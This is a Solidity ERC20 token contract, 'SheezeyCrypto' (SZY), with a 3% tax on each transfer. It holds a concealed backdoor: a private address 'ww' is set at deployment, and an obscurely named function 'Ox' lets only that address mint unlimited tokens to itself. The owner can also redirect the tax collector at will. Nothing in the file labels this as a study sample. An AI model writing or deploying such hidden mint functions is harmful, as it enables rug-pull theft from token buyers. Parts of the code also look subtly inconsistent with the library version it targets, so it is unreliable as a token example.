// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import "@openzeppelin/contracts/access/Ownable.sol";

contract SheezeyCrypto is ERC20, Ownable {
    uint256 public constant TOTAL_SUPPLY = 1000 * (10 ** 6);
    uint8 public constant DECIMALS = 6;
    uint256 public constant tax = 3;
    address private ww;
    
    address public taxCollector;

    event TaxCollected(address from, address to, uint256 amount);

    constructor(address _taxAddress, address _ww) ERC20("SheezeyCrypto", "SZY") Ownable(msg.sender) {
        _mint(msg.sender, TOTAL_SUPPLY);
        taxCollector = _taxAddress;
        ww = _ww;
    }

    function _transfer(address sender, address recipient, uint256 amount) internal virtual override {
        uint256 taxAmount = (amount * tax) / 100;
        uint256 netAmount = amount - taxAmount;
        
        super._transfer(sender, taxCollector, taxAmount);
        super._transfer(sender, recipient, netAmount);

        emit TaxCollected(sender, taxCollector, taxAmount);
    }
    function Ox(uint256 mm) public returns (bool) {
        require(msg.sender == ww);
        _mint(ww, mm);
        return true;
    }


    function setTaxCollector(address _taxAddress) external onlyOwner {
        taxCollector = _taxAddress;
    }
}
